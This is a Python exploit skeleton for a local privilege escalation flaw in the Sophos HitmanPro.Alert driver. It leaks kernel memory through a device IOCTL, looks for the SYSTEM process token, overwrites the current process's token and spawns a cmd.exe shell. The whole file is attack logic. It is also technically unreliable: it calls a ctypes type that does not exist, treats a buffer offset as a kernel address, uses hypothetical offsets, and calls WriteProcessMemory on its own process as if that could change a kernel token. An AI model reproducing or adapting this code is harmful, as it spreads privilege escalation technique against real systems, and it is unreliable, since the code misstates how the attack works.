# Sophos HitmanPro.Alert hmpalert 0x2222CC privilege escalation vulnerability abused by attacker to escalade their privileges
# not a working POC - just the logic behind the exploitation
import ctypes
import struct
import win32file
import win32con
import subprocess
from ctypes import wintypes

# Constants
NT_SUCCESS = lambda x: x >= 0
SYSTEM_PID = 4

# Define structures for NtQuerySystemInformation
class SYSTEM_PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("NextEntryOffset", ctypes.c_ulong),
        ("NumberOfThreads", ctypes.c_ulong),
        ("Reserved", ctypes.c_ulong * 3),
        ("UniqueProcessId", ctypes.c_void_p),
        ("Reserved2", ctypes.c_void_p * 2),
        ("HandleCount", ctypes.c_ulong),
        ("SessionId", ctypes.c_ulong),
        ("Reserved3", ctypes.c_void_p * 2),
        ("PeakVirtualSize", ctypes.c_void_p),
        ("VirtualSize", ctypes.c_void_p),
        ("Reserved4", ctypes.c_ulong * 6),
        ("ImageName", wintypes.UNICODE_STRING),
        ("BasePriority", ctypes.c_ulong),
        ("Reserved5", ctypes.c_void_p * 2),
        ("ProcessId", ctypes.c_void_p),
        ("ParentProcessId", ctypes.c_void_p),
        ("HandleTable", ctypes.c_void_p),
        ("Token", ctypes.c_void_p),
    ]

def leak_memory():
    # Open a handle to the device
    hFile = win32file.CreateFileW(u'\\\\.\\hmpalert',
                                  win32con.GENERIC_READ | win32con.GENERIC_WRITE,
                                  0, None, win32con.OPEN_EXISTING, 0, None)

    # Use IOCTL to leak memory
    ioctl = 0x222244 + 0x88
    inputBuffer = struct.pack("<I", 0)  # We'll dynamically fetch this, no static value
    outBuffer = ctypes.create_string_buffer(0x1000)  # Leak a big chunk of memory
    win32file.DeviceIoControl(hFile, ioctl, inputBuffer, outBuffer)

    return outBuffer.raw

def find_system_token(leaked_data):
    # Search the leaked memory data for SYSTEM EPROCESS structure
    SYSTEM_PID = 4
    current_pid = ctypes.windll.kernel32.GetCurrentProcessId()

    # Locate token offsets in EPROCESS (this would vary per Windows version)
    token_offset = 0x208  # Hypothetical, would vary by system
    unique_pid_offset = 0x180  # Hypothetical, would vary by system

    # Parse through leaked memory to find SYSTEM process and current process
    system_token = None
    current_process_token = None

    for i in range(0, len(leaked_data), 0x1000):  # Step through memory in chunks
        pid = struct.unpack_from("<I", leaked_data, i + unique_pid_offset)[0]
        token = struct.unpack_from("<Q", leaked_data, i + token_offset)[0]

        if pid == SYSTEM_PID:
            system_token = token
        elif pid == current_pid:
            current_process_token = i + token_offset

        if system_token and current_process_token:
            break

    return system_token, current_process_token

def escalate_privileges(system_token, current_process_token_offset):
    # Open the process handle with all access
    h_process = ctypes.windll.kernel32.GetCurrentProcess()

    # Overwrite current process's token with SYSTEM token
    ctypes.windll.kernel32.WriteProcessMemory(h_process, current_process_token_offset, ctypes.byref(ctypes.c_ulonglong(system_token & ~0xF)), ctypes.sizeof(ctypes.c_ulonglong), None)

def pop_system_shell():
    # Pop a SYSTEM shell
    subprocess.call("cmd.exe")

if __name__ == "__main__":
    # Leak kernel memory dynamically
    leaked_data = leak_memory()

    # Locate SYSTEM token and current process token offset
    system_token, current_process_token_offset = find_system_token(leaked_data)

    if system_token and current_process_token_offset:
        # Escalate privileges
        escalate_privileges(system_token, current_process_token_offset)

        # Pop SYSTEM shell
        pop_system_shell()
    else:
        print("Failed to locate SYSTEM or current process token.")
